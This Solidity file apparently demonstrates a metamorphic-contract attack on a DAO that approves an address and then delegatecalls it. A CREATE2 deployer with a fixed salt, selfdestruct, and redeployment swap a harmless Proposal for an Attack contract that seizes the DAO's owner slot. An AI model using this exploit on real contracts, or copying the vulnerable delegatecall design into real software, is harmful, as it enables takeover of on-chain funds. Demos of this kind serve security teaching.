// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

contract DAO {
    struct Proposals {
        address target;
        bool approved;
        bool executed;
    }

    address public owner = msg.sender;
    Proposals[] public proposals;

    function approve(address target) external {
        require(msg.sender == owner, "Not authorized");
        proposals.push(
            Proposals({target: target, approved: true, executed: false})
        );
    }

    function execute(uint proposalId) external payable {
        Proposals storage proposal = proposals[proposalId];
        require(proposal.approved, "Not approved");
        require(!proposal.executed, "Already executed");

        proposal.executed = true;

        (bool ok, ) = proposal.target.delegatecall(
            abi.encodeWithSignature("executeProposal()")
        );
        require(ok, "delegatecall failed");
    }
}

contract Proposal {
    event Log(string message);

    function executeProposal() external {
        emit Log("Executed code approved by DAO");
    }

    function emergencyStop() external {
        selfdestruct(payable(address(0)));
    }
}

contract Attack {
    event Log(string message);

    address public owner;

    function executeProposal() external {
        emit Log("Executed code approved by DAO");
        // For example - set DAO's owner to attacker
        owner = msg.sender;
    }
}

contract DeployerDeployer {
    event Log(address addr);

    function deploy() external {
        bytes32 salt = keccak256(abi.encode(uint(123)));
        address addr = address(new Deployer{salt: salt}());
        emit Log(addr);
    }
}

contract Deployer {
    event Log(address addr);

    function deployProposal() external {
        address addr = address(new Proposal());
        emit Log(addr);
    }

    function deployAttack() external {
        address addr = address(new Attack());
        emit Log(addr);
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}
